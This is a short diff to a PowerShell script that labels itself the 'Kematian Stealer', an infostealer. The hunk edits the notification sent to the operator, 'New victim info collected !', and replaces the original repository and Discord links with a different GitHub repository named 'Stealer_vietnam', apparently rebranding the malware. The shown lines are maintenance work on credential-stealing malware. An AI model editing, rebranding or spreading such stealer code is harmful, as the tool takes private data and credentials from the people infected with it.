@@ -1232,11 +1232,11 @@ function Backup-Data {
         "username"   = "Kematian"
         "color"      = "15105570"
         "avatar_url" = "https://i.imgur.com/6w6qWCB.jpeg"
-        "url"        = "https://discord.com/invite/WJCNUpxnrE"
+        "url"        = "https://github.com/s1uiasdad/Stealer_vietnam"
         "embeds"     = @(
             @{
                 "title"       = "Kematian Stealer"
-                "url"         = "https://github.com/adasdasdsaf/Kematian-Stealer"
+                "url"         = "https://github.com/s1uiasdad/Stealer_vietnam"
                 "description" = "New victim info collected !"
                 "color"       = "15105570"
                 "footer"      = @{
